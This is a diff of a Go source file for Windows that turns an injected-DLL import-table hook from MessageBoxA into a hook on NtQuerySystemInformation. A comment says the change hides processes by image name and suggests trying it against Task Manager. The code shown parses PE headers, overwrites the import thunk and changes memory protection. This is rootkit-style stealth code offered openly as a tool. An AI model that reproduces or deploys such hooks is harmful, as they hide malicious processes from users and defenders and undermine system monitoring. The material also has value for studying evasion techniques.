@@ -1,14 +1,15 @@
 //go:build windows
 // +build windows
 
-// Perform an IAT hook into an injected process, this one hooks the MessageBoxA function but could be used against more interesting targets such as clipboard, hiding objects, crypto calls :)
+// Perform an IAT hook into an injected process, this one hooks the NtQuerySystemInformation function and hides a process(es) based on the image name. Try against Task Manager! :)
+//
+// Only supports 64bit processes
 package main
 
-// build with:
-// go build -buildmode=c-shared -ldflags="-w -s" -trimpath -o iathook.dll
-
 /*
-extern int HookedMessageBoxAFunc(unsigned int hWnd, char*, char*, unsigned int);
+#include <windows.h>
+
+extern LONG HookedNtQuerySystemInformation(INT, PVOID, ULONG, PULONG);
 */
 import "C"
 
@@ -24,13 +25,13 @@ import (
 const (
 	IMAGE_IMPORT_DESCRIPTOR_SIZE = 20
 	IMAGE_THUNK_DATA_SIZE        = 8
-	DLL_NAME                     = "USER32.dll"
-	FUNCTION_NAME                = "MessageBoxA"
+	DLL_NAME                     = "ntdll.dll"
+	FUNCTION_NAME                = "NtQuerySystemInformation"
 )
 
 var (
-	modUser32           = syscall.MustLoadDLL(DLL_NAME)
-	OriginalMessageBoxA = modUser32.MustFindProc(FUNCTION_NAME)
+	modntdll                         = syscall.MustLoadDLL(DLL_NAME)
+	OriginalNtQuerySystemInformation = modntdll.MustFindProc(FUNCTION_NAME)
 )
 
 func setHook() error {
@@ -40,7 +41,6 @@ func setHook() error {
 		return err
 	}
 
-	//TODO: work out if 32 or 64 bit
 	dosHdr := (*win32.IMAGE_DOS_HEADER)(unsafe.Pointer(baseAddr))
 	ntHdr := (*win32.IMAGE_NT_HEADERS64)(unsafe.Pointer((baseAddr + uintptr(dosHdr.E_lfanew))))
 	optHdr := (*win32.IMAGE_OPTIONAL_HEADER64)(unsafe.Pointer(&ntHdr.OptionalHeader))
@@ -85,7 +85,7 @@ func setHook() error {
 	if res == 0 {
 		return err
 	}
-	firstThunk.Function = uint64(uintptr(C.HookedMessageBoxAFunc))
+	firstThunk.Function = uint64(uintptr(C.HookedNtQuerySystemInformation))
 	res, _, err = win32.ProcVirtualProtect.Call(uintptr(unsafe.Pointer(firstThunk)), 8, uintptr(oldProtect), uintptr(unsafe.Pointer(&oldProtect)))
 	if res == 0 {
 		return err
